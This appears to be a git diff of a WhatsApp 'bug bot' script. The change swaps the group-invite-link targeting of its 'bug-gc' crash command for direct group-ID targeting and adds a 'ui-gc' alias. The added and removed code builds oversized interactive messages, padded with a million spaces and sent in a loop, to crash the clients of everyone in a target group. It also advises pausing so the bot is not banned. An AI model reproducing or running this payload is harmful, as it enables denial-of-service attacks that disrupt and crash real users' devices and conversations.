@@ -1102,8 +1102,8 @@ deltaxcrash.sendMessage(m.chat, {
 ┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
 ┗━━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━   
-┃⬮ bug-gc <linkgc>
-┃⬮ ui-gc <linkgc>
+┃⬮ bug-gc <jidgc>
+┃⬮ ui-gc <jidgc>
 ┃⬮ reset-gc <linkgc>
 ┃⬮ kill-gc <linkgc>
 ┗━━━━━━━━━━━━━━━━━
@@ -2948,46 +2948,7 @@ await reply(`</> Bugs have been sent... `)
 }
 break
 //=================================================//
-case 'gfsCdgsGsGs': case 'bug-gc': {
 
-if (!isPremium) return reply('_</> Can only be used by premium users..._')
-if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`)
-reply(`</> Bugs have been sent... `)
-let result = args[0].split('https://chat.whatsapp.com/')[1];
-let target = await deltaxcrash.groupAcceptInvite(result);
-for (let j = 0; j < 5; j++) {
-var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
-message: {
-  "interactiveMessage": {
-    "header": {
-      "title": "",
-      "subtitle": " "
-    },
-    "body": {
-      "text": "🩸⃟༑⌁⃰𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
-    },
-    "footer": {
-      "text": "›          #𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 crash"
-    },
-    "nativeFlowMessage": {
-      "buttons": [
-        {
-          "name": "cta_url",
-          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
-        }
-      ],
-      "messageParamsJson": " ".repeat(1000000)
-    }
-  }
-}
-}
-}), { userJid: m.chat, quoted: ryobug })
-await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
-await sleep(700)
-}
-reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
-}
-break
 case 'gfsCdgsGsGs': case 'reset-gc': {
 
 if (!isPremium) return reply('_</> Can only be used by premium users..._')
@@ -3029,6 +2990,44 @@ reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Paus
 }
 break
 //=================================================//
+case 'bug-gc': case 'ui-gc': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 1962623836281@g.us`)
+reply(mess.bugrespon)
+target = q
+for (let j = 0; j < 5; j++) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
+message: {
+  "interactiveMessage": {
+    "header": {
+      "title": "",
+      "subtitle": " "
+    },
+    "body": {
+      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
+    },
+    "footer": {
+      "text": "›          #ryozingoddominate"
+    },
+    "nativeFlowMessage": {
+      "buttons": [
+        {
+          "name": "cta_url",
+          "buttonParamsJson": "{ display_text : '⿻𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⿻', url : , merchant_url :  }"
+        }
+      ],
+      "messageParamsJson": " ".repeat(1000000)
+    }
+  }
+}
+}
+}), { userJid: m.chat, quoted: ryobug })
+await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
+await sleep(700)
+}
+reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
 case 'kill-gc': case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> Can only be used by premium users..._')
